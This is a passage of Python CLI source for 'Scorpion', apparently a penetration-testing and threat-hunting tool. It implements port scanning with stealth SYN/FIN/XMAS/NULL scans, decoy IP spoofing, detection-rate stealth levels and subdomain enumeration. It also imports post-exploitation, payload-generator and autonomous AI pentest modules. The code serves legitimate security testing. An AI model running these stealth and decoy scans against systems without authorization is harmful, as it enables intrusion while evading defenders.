import asyncio
import json
import sys
from typing import List, Optional, cast
import os
import datetime
from pathlib import Path

import typer
import rich
from rich.console import Console
from rich.panel import Panel
from rich import box
PILImage = None  # Optional, if Pillow is installed
console = Console()
from rich.console import Console
from rich.table import Table
from rich import box

# Load .env file if it exists (for API keys)
try:
    from dotenv import load_dotenv
    # Look for .env in current directory and parent directories
    env_path = Path.cwd() / '.env'
    if env_path.exists():
        try:
            load_dotenv(env_path, encoding='utf-8')
        except UnicodeDecodeError:
            # Skip invalid .env file
            pass
    else:
        # Try parent directories (in case user is in subdirectory)
        for parent in Path.cwd().parents:
            env_path = parent / '.env'
            if env_path.exists():
                try:
                    load_dotenv(env_path, encoding='utf-8')
                    break
                except UnicodeDecodeError:
                    # Skip invalid .env file
                    continue
except ImportError:
    # python-dotenv not installed, environment variables still work
    pass

from .scanner import async_port_scan, async_udp_scan, async_syn_scan, async_advanced_scan
from .ssl_analyzer import analyze_ssl
from .takeover import takeover_scan
from .subdomain_enum import enumerate_subdomains
from .api import api_probe
from .recon import recon
from .dirbuster import dirbust_scan
from .tech import detect_tech
from .reporter import generate_html_report, generate_summary_html_report
from .crawler import crawl as web_crawl
from .cloud import cloud_audit
from .k8s import k8s_audit
from .container_sec import container_audit
# Note: APISecurityTester removed in Phase 1 optimization (use api.py functions instead)
from .db_pentest import DatabasePentester
from .post_exploit import PostExploitation
from .ci_integration import CICDIntegration, run_ci_scan
from .web_owasp import web_owasp_passive
from .web_pentest import AdvancedWebTester
from .os_fingerprint import OSFingerprinter
# Optional import: payload generator (avoid breaking CLI if missing in editable install)
try:
    from .payload_generator import PayloadGenerator, PayloadType, PayloadFormat
except ImportError:  # pragma: no cover
    PayloadGenerator = None  # type: ignore
    PayloadType = None  # type: ignore
    PayloadFormat = None  # type: ignore
from .decoy_scanner import DecoyScanner, parse_decoy_option, DecoyConfig
from .ai_pentest import (
    AIPentestAgent,
    AIPentestConfig,
    PrimaryGoal,
    AutonomyLevel,
    StealthLevel,
    RiskTolerance
)
# Blue Team imports
from .threat_hunter import ThreatHunter, IOC, Anomaly
from .purple_team import PurpleTeamSimulator
from .remote_access import SSHRemoteAccess, is_ssh_url, fetch_remote_log, fetch_multiple_servers

# Remove subtitle under banner by not setting a global help description
app = typer.Typer()

@app.callback(invoke_without_command=True)
def _banner_callback(
    ctx: typer.Context,
    no_banner: bool = typer.Option(False, "--no-banner", is_flag=True, help="Suppress startup banner"),
    version: bool = typer.Option(False, "--version", is_flag=True, help="Show version and exit"),
):
    """"""
    # Only show banner when no subcommand is invoked and banner not suppressed
    if version:
        try:
            import importlib.metadata as _md
            v = _md.version("python-scorpion")
        except Exception:
            v = "unknown"
        typer.echo(v)
        raise typer.Exit()
    if ctx.invoked_subcommand is not None or no_banner:
        return
    img_paths = [
        "public/scorpion.png",
        "public/scorpion.jpg",
        "public/scorpion-banner.png",
    ]
    img_path = None
    for p in img_paths:
        try:
            import os
            if os.path.exists(p):
                img_path = p
                break
        except Exception:
            pass

    # If an image path exists, show a panel referencing it (no external deps required)
    # Note: Print the ASCII banner first, then show image reference below it if present

    # Banner with red borders and yellow SCORPION text
    console.print("\n[red]╔══════════════════════════════════════════════════════════════════════╗[/red]")
    console.print("[red]║[/red]   [yellow]███████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██╗ ██████╗ ███╗   ██╗[/yellow]   [red]║[/red]")
    console.print("[red]║[/red]   [yellow]██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗██║██╔═══██╗████╗  ██║[/yellow]   [red]║[/red]")
    console.print("[red]║[/red]   [yellow]███████╗██║     ██║   ██║██████╔╝██████╔╝██║██║   ██║██╔██╗ ██║[/yellow]   [red]║[/red]")
    console.print("[red]║[/red]   [yellow]╚════██║██║     ██║   ██║██╔══██╗██╔═══╝ ██║██║   ██║██║╚██╗██║[/yellow]   [red]║[/red]")
    console.print("[red]║[/red]   [yellow]███████║╚██████╗╚██████╔╝██║  ██║██║     ██║╚██████╔╝██║ ╚████║[/yellow]   [red]║[/red]")
    console.print("[red]║[/red]   [yellow]╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝[/yellow]   [red]║[/red]")
    console.print("[red]║[/red]                                                                      [red]║[/red]")
    console.print("[red]║[/red]         [yellow]Scorpion — Security Testing & Threat-Hunting CLI[/yellow]            [red]║[/red]")
    console.print("[red]║[/red]                      [cyan]Developed by Prince Sam[/cyan]                          [red]║[/red]")
    console.print("[red]╚══════════════════════════════════════════════════════════════════════╝[/red]\n")
    if img_path:
        console.print(Panel.fit(f"Scorpion Banner Image: {img_path}", title="Scorpion", border_style="green"))
    # Show CLI help beneath the banner on root invocation
    try:
        # Print help without a descriptive subtitle (already removed at app init)
        typer.echo(ctx.get_help())
    except Exception:
        pass
    # Getting Started quick tips under the help on initial launch
    quickstart = (
        "Quick Start:\n"
        "- Scan ports: scorpion scan <host> --ports 1-1024 --output results/scan_<host>.json\n"
        "- SSL analyze: scorpion ssl-analyze <host> --output results/ssl_<host>.json\n"
        "- Takeover: scorpion takeover <host> --output results/takeover_<host>.json\n"
        "- API test: scorpion api-test <url> --output results/api_<host>.json\n"
        "- Recon: scorpion recon-cmd <host> --output results/recon_<host>.json\n"
        "- Tip: suppress banner in scripts with --no-banner"
    )
    console.print(Panel.fit(quickstart, title="Getting Started", border_style="cyan", box=box.ROUNDED))
console = Console()

@app.command()
def scan(
    host: Optional[str] = typer.Argument(None, help="Target host (positional)"),
    target: Optional[str] = typer.Option(None, "--target", "-t", help="Alias for host (supports -t)"),
    ports: str = typer.Option("1-65535", "--ports", "-p", help="Ports to scan (default: 1-65535, e.g., 80,443,8080 or 1-1000)"),
    concurrency: int = typer.Option(500, "--concurrency", "-C", help="Concurrent probes (default: 500 for aggressive scanning)"),
    timeout: float = typer.Option(1.0, "--timeout", help="Timeout seconds per probe"),
    retries: int = typer.Option(0, "--retries", "-R", help="Retries on timeouts (reserved)"),
    udp: bool = typer.Option(False, "--udp", "-U", help="Enable UDP scanning (best-effort)"),
    udp_ports: Optional[str] = typer.Option(None, "--udp-ports", "-u", help="UDP ports range/list; default top ports if omitted"),
    only_open: bool = typer.Option(True, "--only-open/--show-all", help="Show only open ports (default, like nmap --open). Use --show-all to see closed/filtered"),
    raw: bool = typer.Option(False, "--raw", help="Show raw banner only; do not infer service names"),
    no_write: bool = typer.Option(False, "--no-write", help="Do not send probe bytes; connect-and-read only"),
    version_detect: bool = typer.Option(False, "--version-detect", "-sV", help="Enable service version detection (like nmap -sV)"),
    os_detect: bool = typer.Option(False, "--os-detect", "-O", help="Enable OS fingerprinting (requires admin/root + scapy)"),
    fast: bool = typer.Option(False, "--fast", help="Preset: --timeout 0.8 --concurrency 1000 (ultra-fast aggressive scan)"),
    web: bool = typer.Option(False, "--web", help="Preset: comprehensive web ports (80,443,8080,8443,8000-9000 range)"),
    infra: bool = typer.Option(False, "--infra", help="Preset: common infra ports and only-open"),
    full: bool = typer.Option(False, "--full", help="Preset: comprehensive scan of 50+ common ports (web, db, infra, apps)"),
    syn: bool = typer.Option(False, "--syn", "-sS", help="TCP SYN scan (stealth, requires admin/root + scapy)"),
    fin: bool = typer.Option(False, "--fin", "-sF", help="TCP FIN scan (stealth, requires admin/root + scapy)"),
    xmas: bool = typer.Option(False, "--xmas", "-sX", help="TCP XMAS scan (stealth, requires admin/root + scapy)"),
    null: bool = typer.Option(False, "--null", "-sN", help="TCP NULL scan (stealth, requires admin/root + scapy)"),
    ack: bool = typer.Option(False, "--ack", "-sA", help="TCP ACK scan (firewall detection, requires admin/root + scapy)"),
    decoy: Optional[str] = typer.Option(None, "--decoy", "-D", help="Decoy scan: RND:count (random), ME (real IP only), or IP1,IP2,ME (manual list)"),
    timing: Optional[str] = typer.Option(None, "-T", help="Timing template: paranoid, sneaky, polite, normal, aggressive, insane (like nmap -T0 to -T5)"),
    stealth: str = typer.Option("medium", "--stealth", "-S", help="Stealth level: low (fast, 70%% detect), medium (45%% detect), high (25%% detect), ninja (<15%% detect, red team)"),
    syn_rate: float = typer.Option(0.0, "--rate-limit", help="Limit advanced scan probes per second (0 = unlimited)"),
    syn_iface: str = typer.Option("", "--iface", help="Network interface name for advanced scans (Scapy)"),
    list_ifaces: bool = typer.Option(False, "--list-ifaces", help="List available interfaces for advanced scans and exit"),
    output: Optional[str] = None,
):
    """
    Production TCP/UDP port scanner with advanced capabilities.
    Supports multiple scan types, version detection, OS fingerprinting, and timing templates.
    """
    async def run():
        tgt = target or host
        
        # List interfaces and exit
        if list_ifaces:
            try:
                from scapy.all import get_if_list
                ifaces = get_if_list()
            except Exception:
                ifaces = []
            table = Table(title="Available Interfaces", box=box.MINIMAL)
            table.add_column("Name", style="cyan")
            for i in ifaces:
                table.add_row(i)
            if not ifaces:
                console.print("No interfaces found or Scapy not installed.", style="yellow")
                console.print("Install Scapy: pip install scapy", style="yellow")
            else:
                console.print(table)
            raise typer.Exit()
        
        if not tgt:
            console.print("Provide a host (positional) or --target", style="red")
            raise typer.Exit(code=2)
        
        # Input validation
        if not tgt or not tgt.strip():
            console.print("[red]Error: Target hostname/IP is required[/red]")
            raise typer.Exit(code=2)
        
        tgt = tgt.strip()
        
        # Parse URL to extract hostname (handle http://, https://, port numbers)
        import socket
        from urllib.parse import urlparse
        
        # Remove protocol prefix if present
        target_to_validate = tgt
        if "://" in tgt:
            parsed = urlparse(tgt)
            target_to_validate = parsed.hostname or parsed.netloc.split(':')[0]
        # Remove port number if present (e.g., "192.168.1.1:8080" -> "192.168.1.1")
        elif ":" in tgt and not tgt.count(":") > 1:  # Not IPv6
            target_to_validate = tgt.split(":")[0]
        
        # Validate hostname/IP format
        try:
            # Try to resolve hostname
            socket.getaddrinfo(target_to_validate, None)
            # Use cleaned hostname for scanning
            tgt = target_to_validate
        except socket.gaierror:
            console.print(f"[red]Error: Cannot resolve hostname '{target_to_validate}'[/red]")
            console.print("[yellow]Tip: Check spelling or try using IP address directly[/yellow]")
            raise typer.Exit(code=2)
        except Exception as e:
            console.print(f"[red]Error validating target: {e}[/red]")
            raise typer.Exit(code=2)
        
        # Apply timing templates (nmap-style T0-T5)
        timeout_local = timeout
        retries_local = retries
        concurrency_local = concurrency
        only_open_local = only_open
        ports_local = ports
        rate_limit = syn_rate
        
        if timing:
            timing_lower = timing.lower()
            if timing_lower in ["paranoid", "t0", "0"]:
                # T0: Paranoid - 5 min timeout per probe, serial
                timeout_local = 300.0
                concurrency_local = 1
                rate_limit = 0.016  # ~1 probe per minute
            elif timing_lower in ["sneaky", "t1", "1"]:
                # T1: Sneaky - 15s timeout, very low concurrency
                timeout_local = 15.0
                concurrency_local = 5
                rate_limit = 0.2  # 1 probe per 5 seconds
            elif timing_lower in ["polite", "t2", "2"]:
                # T2: Polite - 10s timeout, low concurrency
                timeout_local = 10.0
                concurrency_local = 10
                rate_limit = 1.0  # 1 probe per second
            elif timing_lower in ["normal", "t3", "3"]:
                # T3: Normal - default settings
                timeout_local = 3.0
                concurrency_local = 50
                rate_limit = 10.0
            elif timing_lower in ["aggressive", "t4", "4"]:
                # T4: Aggressive - fast scan
                timeout_local = 1.5
                concurrency_local = 100
                rate_limit = 100.0
            elif timing_lower in ["insane", "t5", "5"]:
                # T5: Insane - maximum speed (may miss results)
                timeout_local = 0.5
                concurrency_local = 500
                rate_limit = 0.0  # unlimited
            else:
                console.print(f"Invalid timing template: {timing}", style="red")
                console.print("Valid options: paranoid, sneaky, polite, normal, aggressive, insane (or T0-T5)", style="yellow")
                raise typer.Exit(code=2)
        
        # Validate timeout and concurrency
        if timeout_local <= 0 or timeout_local > 300:
            console.print(f"[red]Error: Invalid timeout {timeout_local}. Must be between 0 and 300 seconds[/red]")
            raise typer.Exit(code=2)
        
        if concurrency_local < 1 or concurrency_local > 10000:
            console.print(f"[red]Error: Invalid concurrency {concurrency_local}. Must be between 1 and 10000[/red]")
            raise typer.Exit(code=2)
        
        # Apply presets (can override timing)
        if fast:
            timeout_local = 0.8
            retries_local = 0
            concurrency_local = 1000
            only_open_local = True
            console.print("[cyan]Fast mode: Ultra-aggressive scan (timeout=0.8s, concurrency=1000)[/cyan]")
        if web:
            ports_local = "80,443,8080,8443,8000,8001,8008,8080,8081,8082,8090,8180,8443,8888,9000,9001,9090,3000,4000,5000,7000,7001,7002"
            only_open_local = True
            console.print("[cyan]Web mode: Scanning comprehensive web service ports[/cyan]")
        if infra:
            ports_local = "22,25,53,80,110,143,443,3389,5432,3306,1433,1521,5900,6379,27017,9200,11211"
            only_open_local = True
            console.print("[cyan]Infra mode: Scanning infrastructure and database ports[/cyan]")
        if full:
            # Comprehensive port list: web, database, infra, remote access, apps
            ports_local = (
                "21,22,23,25,53,80,110,111,135,139,143,443,445,465,587,993,995,"  # Standard services
                "1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,"  # Databases & remote access
                "27017,5601,9200,9300,11211,6379,50000,"  # NoSQL & caching
                "3000,5000,8000,8009,8081,8082,8090,9000,9090,9091,9999,"  # Web apps
                "2222,2375,2376,4243,4444,5555,7001,7002,8161,8181,10000"  # Alt ports & management
            )
            console.print("[cyan]Full scan enabled: Scanning 50+ common ports across all service categories[/cyan]")
            console.print("[yellow]Tip: This may take longer. Use -T aggressive or --fast for speed[/yellow]")

        # Parse ports
        targets: List[int] = []
        udp_targets: List[int] = []
        results: List[dict] = []
        results_udp: List[dict] = []
        
        if "," in ports_local:
            targets = [int(p.strip()) for p in ports_local.split(",")]
        elif "-" in ports_local:
            start, end = ports_local.split("-")
            targets = list(range(int(start), int(end) + 1))
        else:
            targets = [int(ports_local)]

        if udp:
            if udp_ports:
                if "," in udp_ports:
                    udp_targets = [int(p.strip()) for p in udp_ports.split(",")]
                elif "-" in udp_ports:
                    us, ue = udp_ports.split("-")
                    udp_targets = list(range(int(us), int(ue) + 1))
                else:
                    udp_targets = [int(udp_ports)]
            else:
                # Default top UDP ports
                udp_targets = [53, 123, 161, 500, 137, 138, 67, 68, 69, 1900]

        # Execute scans based on flags
        scan_type_count = sum([syn, fin, xmas, null, ack])
        if scan_type_count > 1:
            console.print("ERROR: Only one advanced scan type allowed at a time (--syn, --fin, --xmas, --null, --ack)", style="red")
            raise typer.Exit(code=2)
        
        # Decoy scanning (works with advanced scans only)
        decoy_scanner = None
        decoy_config = None
        decoy_results = None
        
        if decoy:
            if not any([syn, fin, xmas, null, ack]):
                console.print("ERROR: Decoy scanning requires an advanced scan type (--syn, --fin, --xmas, --null, or --ack)", style="red")
                console.print("Tip: Use --syn --decoy RND:5 for decoy scanning", style="yellow")
                raise typer.Exit(code=2)
            
            console.print(f"\n[cyan]=== Decoy Scanning Enabled ===[/cyan]")
            console.print(f"[yellow]WARNING: Decoy scanning requires administrator/root privileges[/yellow]")
            
            try:
                # Parse decoy configuration
                decoy_config = parse_decoy_option(decoy, tgt, count=5)
                console.print(f"Decoy Mode: {decoy_config.mode.value}")
                
                # Initialize decoy scanner
                decoy_scanner = DecoyScanner()
                
                # Determine scan type for decoys
                decoy_scan_type = "syn" if syn else ("fin" if fin else ("xmas" if xmas else ("null" if null else "ack")))
                
                # Perform decoy scan
                console.print(f"Sending decoy packets ({decoy_scan_type} scan)...")
                decoy_results = await decoy_scanner.perform_decoy_scan(
                    tgt, targets, decoy_config, decoy_scan_type
                )
                
                # Display decoy information
                console.print(f"\n[green]✓ Decoy Scan Complete[/green]")
                console.print(f"  Decoys Used: {len(decoy_results['decoys_used'])} IPs")
                console.print(f"  Real IP Position: {decoy_results['real_ip_position'] + 1} of {len(decoy_results['decoys_used'])}")
                console.print(f"  Packets Sent: {decoy_results['total_packets_sent']}")
                console.print(f"  Success Rate: {decoy_results['success_rate']:.1f}%")
                
                # Show decoy IPs (first 5 for brevity)
                console.print(f"\n[cyan]Decoy IPs (showing first 5):[/cyan]")
                for i, ip in enumerate(decoy_results['decoys_used'][:5]):
                    marker = " [YOU]" if ip == decoy_results['real_ip'] else ""
                    console.print(f"  {i+1}. {ip}{marker}")
                if len(decoy_results['decoys_used']) > 5:
                    console.print(f"  ... and {len(decoy_results['decoys_used']) - 5} more")
                
            except PermissionError as pe:
                console.print(f"[red]{str(pe)}[/red]")
                import os as os_module
                if os_module.name == 'nt':
                    console.print("[yellow]Windows: Run PowerShell as Administrator[/yellow]")
                else:
                    console.print("[yellow]Linux/Unix: Run with sudo -E env PATH=$PATH scorpion ...[/yellow]")
                raise typer.Exit(code=1)
            except Exception as e:
                console.print(f"[red]Decoy scan error: {e}[/red]")
                raise typer.Exit(code=1)
        
        if syn:
            try:
                results = await async_syn_scan(tgt, targets, concurrency=concurrency_local, timeout=timeout_local, rate_limit=rate_limit, iface=syn_iface)
            except ValueError as ve:
                console.print(f"[red]Input validation error: {ve}[/red]")
                raise typer.Exit(code=2)
            except PermissionError as pe:
                console.print(str(pe), style="red")
                import os as os_module
                if os_module.name == 'nt':
                    console.print("Windows: Run PowerShell as Administrator", style="yellow")
                else:
                    console.print("Linux/Unix: Run with 'sudo -E env PATH=$PATH scorpion ...' or 'sudo $(which python3) -m python_scorpion.cli ...'", style="yellow")
                raise typer.Exit(code=1)
            except Exception as e:
                console.print(f"SYN scan error: {e}", style="red")
                console.print("Ensure Scapy is installed: pip install scapy", style="yellow")
                raise typer.Exit(code=1)
        elif fin:
            try:
                results = await async_advanced_scan(tgt, targets, "fin", concurrency=concurrency_local, timeout=timeout_local, rate_limit=rate_limit, iface=syn_iface)
            except ValueError as ve:
                console.print(f"[red]Input validation error: {ve}[/red]")
                raise typer.Exit(code=2)
            except PermissionError as pe:
                console.print(str(pe), style="red")
                import os as os_module
                if os_module.name == 'nt':
                    console.print("Windows: Run PowerShell as Administrator", style="yellow")
                else:
                    console.print("Linux/Unix: Run with sudo", style="yellow")
                raise typer.Exit(code=1)
            except Exception as e:
                console.print(f"FIN scan error: {e}", style="red")
                console.print("Ensure Scapy is installed: pip install scapy", style="yellow")
                raise typer.Exit(code=1)
        elif xmas:
            try:
                results = await async_advanced_scan(tgt, targets, "xmas", concurrency=concurrency_local, timeout=timeout_local, rate_limit=rate_limit, iface=syn_iface)
            except ValueError as ve:
                console.print(f"[red]Input validation error: {ve}[/red]")
                raise typer.Exit(code=2)
            except PermissionError as pe:
                console.print(str(pe), style="red")
                import os as os_module
                if os_module.name == 'nt':
                    console.print("Windows: Run PowerShell as Administrator", style="yellow")
                else:
                    console.print("Linux/Unix: Run with sudo", style="yellow")
                raise typer.Exit(code=1)
            except Exception as e:
                console.print(f"XMAS scan error: {e}", style="red")
                console.print("Ensure Scapy is installed: pip install scapy", style="yellow")
                raise typer.Exit(code=1)
        elif null:
            try:
                results = await async_advanced_scan(tgt, targets, "null", concurrency=concurrency_local, timeout=timeout_local, rate_limit=rate_limit, iface=syn_iface)
            except ValueError as ve:
                console.print(f"[red]Input validation error: {ve}[/red]")
                raise typer.Exit(code=2)
            except PermissionError as pe:
                console.print(str(pe), style="red")
                import os as os_module
                if os_module.name == 'nt':
                    console.print("Windows: Run PowerShell as Administrator", style="yellow")
                else:
                    console.print("Linux/Unix: Run with sudo", style="yellow")
                raise typer.Exit(code=1)
            except Exception as e:
                console.print(f"NULL scan error: {e}", style="red")
                console.print("Ensure Scapy is installed: pip install scapy", style="yellow")
                raise typer.Exit(code=1)
        elif ack:
            try:
                results = await async_advanced_scan(tgt, targets, "ack", concurrency=concurrency_local, timeout=timeout_local, rate_limit=rate_limit, iface=syn_iface)
            except ValueError as ve:
                console.print(f"[red]Input validation error: {ve}[/red]")
                raise typer.Exit(code=2)
            except PermissionError as pe:
                console.print(str(pe), style="red")
                import os as os_module
                if os_module.name == 'nt':
                    console.print("Windows: Run PowerShell as Administrator", style="yellow")
                else:
                    console.print("Linux/Unix: Run with sudo", style="yellow")
                raise typer.Exit(code=1)
            except Exception as e:
                console.print(f"ACK scan error: {e}", style="red")
                console.print("Ensure Scapy is installed: pip install scapy", style="yellow")
                raise typer.Exit(code=1)
        else:
            # Regular TCP connect scan
            try:
                results = await async_port_scan(tgt, targets, concurrency=concurrency_local, timeout=timeout_local, no_write=no_write, version_detection=version_detect)
            except ValueError as ve:
                console.print(f"[red]Input validation error: {ve}[/red]")
                raise typer.Exit(code=2)
            except Exception as e:
                console.print(f"[red]Scan error: {e}[/red]")
                raise typer.Exit(code=1)
        
        # UDP scan if requested
        if udp and udp_targets:
            try:
                results_udp = await async_udp_scan(tgt, udp_targets, concurrency=concurrency_local, timeout=timeout_local)
            except ValueError as ve:
                console.print(f"[red]Input validation error: {ve}[/red]")
                raise typer.Exit(code=2)
            except Exception as e:
                console.print(f"[red]UDP scan error: {e}[/red]")
                raise typer.Exit(code=1)
        
        # Output results
        if output:
            payload = {"target": tgt, "ports": targets, "results": results}
            if results_udp:
                payload.update({"udp_ports": udp_targets, "udp_results": results_udp})
            if decoy_results:
                payload["decoy_scan"] = decoy_results
            with open(output, "w", encoding="utf-8") as f:
                json.dump(payload, f, ensure_ascii=False, indent=2)
            console.print(f"[green]Results saved to:[/green] {output}")
        
        # Nmap-style scan header
        import datetime
        # Cross-platform time format (avoid %Z which fails on some systems)
        scan_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        scan_type = "SYN" if syn else ("FIN" if fin else ("XMAS" if xmas else ("NULL" if null else ("ACK" if ack else "TCP Connect"))))
        
        console.print(f"\n[bold cyan]Starting Scorpion 2.0[/bold cyan] ( https://github.com/Prince12sam/Scorpion ) at {scan_time}")
        console.print(f"[cyan]Scan Type:[/cyan] {scan_type} Scan")
        console.print(f"[cyan]Scan report for:[/cyan] {tgt}")
        
        # Resolve IP for display (like nmap shows both hostname and IP)
        import socket
        try:
            ip_addr = socket.gethostbyname(tgt)
            if ip_addr != tgt:  # Only show if hostname was provided
                console.print(f"[dim]({ip_addr})[/dim]")
        except:
            pass
        
        # Show scan details
        port_count = len(targets)
        console.print(f"[cyan]Ports scanned:[/cyan] {port_count} port(s)")
        if decoy_results:
            console.print(f"[cyan]Decoy IPs:[/cyan] {len(decoy_results['decoys_used'])} (position {decoy_results['real_ip_position'] + 1})")
        console.print()  # Blank line before table
        
        # output table - Nmap style
        table = Table(box=box.SIMPLE, show_header=True, header_style="bold cyan", border_style="dim")
        table.add_column("PORT", style="cyan", no_wrap=True)
        table.add_column("STATE", style="white", no_wrap=True)
        table.add_column("SERVICE", style="white")
        
        # Extended port->service map (nmap-style)
        port_map = {
            21:"ftp", 22:"ssh", 23:"telnet", 25:"smtp", 53:"dns", 67:"dhcp", 68:"dhcp", 69:"tftp",
            80:"http", 110:"pop3", 111:"rpcbind", 135:"msrpc", 139:"netbios-ssn", 143:"imap",
            161:"snmp", 389:"ldap", 443:"https", 445:"microsoft-ds", 465:"smtps", 587:"submission",
            636:"ldaps", 993:"imaps", 995:"pop3s", 1433:"ms-sql-s", 1521:"oracle", 2049:"nfs",
            3306:"mysql", 3389:"ms-wbt-server", 5000:"upnp", 5432:"postgresql", 5900:"vnc",
            6379:"redis", 8000:"http-alt", 8080:"http-proxy", 8443:"https-alt", 8888:"http-alt",
            9000:"cslistener", 9200:"elasticsearch", 11211:"memcache", 27017:"mongodb"
        }
        
        # Apply only_open filter if requested
        rows = [r for r in results if (r["state"]=="open" or not only_open_local)]
        
        # Display results in nmap style
        for r in rows:
            port = r["port"]
            state = r["state"]
            
            # Port column: format as "PORT/tcp" (nmap style)
            port_display = f"{port}/tcp"
            
            # Service detection (prefer version_detect banner, fallback to port map)
            service = ""
            if not raw:
                # Check if we have version detection info
                banner = r.get("reason", "")
                if version_detect and banner:
                    # Extract service from banner (e.g., "SSH-2.0-OpenSSH_8.2" -> "ssh")
                    service = banner.split()[0].split('-')[0].lower() if banner else port_map.get(port, "")
                else:
                    service = port_map.get(port, "")
            
            # Color-code states like nmap
            if state == "open":
                state_colored = f"[green]{state}[/green]"
            elif state == "closed":
                state_colored = f"[red]{state}[/red]"
            elif state == "filtered":
                state_colored = f"[yellow]{state}[/yellow]"
            else:
                state_colored = state
            
            table.add_row(port_display, state_colored, service)
        
        console.print(table)
        
        # Nmap-style statistics summary
        open_ports = [r['port'] for r in results if r['state']=='open']
        closed_ports = [r['port'] for r in results if r['state']=='closed']
        filtered_ports = [r['port'] for r in results if r['state'] in ['filtered', 'open|filtered']]
        
        # "Not shown:" line (nmap style) - only if we filtered out closed/filtered ports
        if only_open_local:
            not_shown = len(closed_ports) + len(filtered_ports)
            if not_shown > 0:
                console.print(f"[dim]Not shown: {not_shown} closed ports[/dim]")
        
        # Summary line
        if not open_ports:
            console.print(f"\n[yellow]All {len(results)} scanned ports are closed or filtered[/yellow]")
        
        # Scan completion message (nmap style)
        console.print(f"\n[cyan]Scorpion done:[/cyan] 1 IP address (1 host up) scanned")
        if open_ports:
            console.print(f"[green]{len(open_ports)} port(s) open[/green]")


        # OS Detection if requested
        if os_detect and open_ports:
            console.print("\n[cyan]═══ OS Fingerprinting ═══[/cyan]")
            try:
                fingerprinter = OSFingerprinter()
                os_result = await fingerprinter.comprehensive_fingerprint(tgt, open_ports)
                
                if os_result.get("consensus"):
                    consensus = os_result["consensus"]
                    console.print(f"\n[green]✓ OS Detected:[/green] {consensus['os']} ({consensus['family']})")
                    console.print(f"  Confidence: {consensus['confidence']}%")
                    console.print(f"  Based on {consensus['measurements']} measurement(s)")
                else:
                    console.print("[yellow]OS fingerprinting did not reach consensus[/yellow]")
                
                # Show detailed fingerprint data
                if os_result.get("fingerprints"):
                    console.print("\n[cyan]Fingerprint Details:[/cyan]")
                    for fp in os_result["fingerprints"][:3]:  # Show top 3
                        if fp.get("ttl"):
                            ttl_info = fp["ttl"]
                            console.print(f"  TTL: {ttl_info['ttl_value']} (estimated {ttl_info['estimated_hops']} hops)")
                            console.print(f"  Hints: {', '.join(ttl_info['os_hints'])}")
                        if fp.get("best_match"):
                            match = fp["best_match"]
                            console.print(f"  Match: {match['os']} ({match['confidence']}%)")
                
                # Save OS detection to output
                if output and os_result:
                    try:
                        with open(output, "r", encoding="utf-8") as f:
                            data = json.load(f)
                        data["os_detection"] = os_result
                        with open(output, "w", encoding="utf-8") as f:
                            json.dump(data, f, ensure_ascii=False, indent=2)
                    except:
                        pass
                        
            except PermissionError as pe:
                console.print(f"[red]{str(pe)}[/red]")
                import os as os_module
                if os_module.name == 'nt':
                    console.print("[yellow]Windows: Run PowerShell as Administrator[/yellow]")
                else:
                    console.print("[yellow]Linux/Unix: Run with sudo or as root[/yellow]")
                    console.print("[yellow]Example: sudo -E env PATH=$PATH scorpion scan ...[/yellow]")
            except Exception as e:
                console.print(f"[yellow]OS detection error: {e}[/yellow]")
                console.print("[yellow]Ensure Scapy is installed: pip install scapy[/yellow]")

        if results_udp:
            table_u = Table(title=f"UDP Scan: {tgt}", box=box.MINIMAL_DOUBLE_HEAD)
            table_u.add_column("Port", style="cyan")
            table_u.add_column("State", style="green")
            table_u.add_column("Service", style="yellow")
            table_u.add_column("Banner/Reason", style="magenta")
            rows_u = [r for r in results_udp if (r["state"]=="open" or not only_open_local)]
            for r in rows_u:
                rsn = r.get("reason", "")
                svc = "" if raw else port_map.get(r["port"], "")
                table_u.add_row(str(r["port"]), r["state"], svc, rsn)
            console.print(table_u)
            open_udp = [r['port'] for r in results_udp if r['state']=='open']
            console.print(f"Open UDP ports: {open_udp}")
        
        # Clean up decoy scanner
        if decoy_scanner:
            decoy_scanner.close()

    asyncio.run(run())

@app.command()
def ssl_analyze(
    host: Optional[str] = typer.Argument(None, help="Target host (positional)"),
    target: Optional[str] = typer.Option(None, "--target", "-t", help="Alias for host (supports -t)"),
    port: int = typer.Option(443, "--port", "-p", help="TLS port"),
    output: Optional[str] = None,
    timeout: float = typer.Option(5.0, "--timeout", "-T", help="Timeout seconds"),
):
    """Analyze TLS/SSL configuration: cert expiry, protocols, ciphers, headers."""
    tgt = target or host
    if not tgt:
        console.print("Provide a host (positional) or --target/-t", style="red")
        raise typer.Exit(code=2)
    report = asyncio.run(analyze_ssl(tgt, port))
    console.print_json(data=report)
    if output:
        with open(output, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        console.print(f"Saved: {output}")

@app.command()
def takeover(host: str, output: Optional[str] = None, timeout: float = 5.0):
    """Scan for potential subdomain takeover based on CNAME and provider fingerprints."""
    report = asyncio.run(takeover_scan(host))
    console.print_json(data=report)
    if output:
        with open(output, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        console.print(f"Saved: {output}")

@app.command()
def subdomain(
    domain: str = typer.Argument(..., help="Target domain (e.g., example.com)"),
    wordlist: Optional[str] = typer.Option(None, "--wordlist", "-w", help="Path to custom subdomain wordlist file"),
    ct_logs: bool = typer.Option(True, "--ct-logs/--no-ct-logs", help="Query Certificate Transparency logs"),
    check_http: bool = typer.Option(False, "--http", help="Check HTTP/HTTPS accessibility of found subdomains"),
    concurrency: int = typer.Option(50, "--concurrency", "-c", help="Concurrent DNS queries"),
    timeout: float = typer.Option(2.0, "--timeout", "-t", help="Timeout per DNS query (seconds)"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output JSON file"),
):
    """
    Enumerate subdomains using DNS brute-force and Certificate Transparency logs.
    
    Techniques used:
    - DNS brute-forcing with built-in wordlist (top 100 common subdomains)
    - Certificate Transparency log queries (crt.sh)
    - Optional HTTP/HTTPS accessibility checks
    
    Examples:
      scorpion subdomain example.com
      scorpion subdomain example.com --wordlist custom.txt --http
      scorpion subdomain example.com --no-ct-logs -c 100
    """
    async def run():
        console.print(f"\n[cyan]═══ Subdomain Enumeration: {domain} ═══[/cyan]\n")
        
        # Load custom wordlist if provided
        wordlist_items = None
        if wordlist:
            try:
                with open(wordlist, "r", encoding="utf-8") as f:
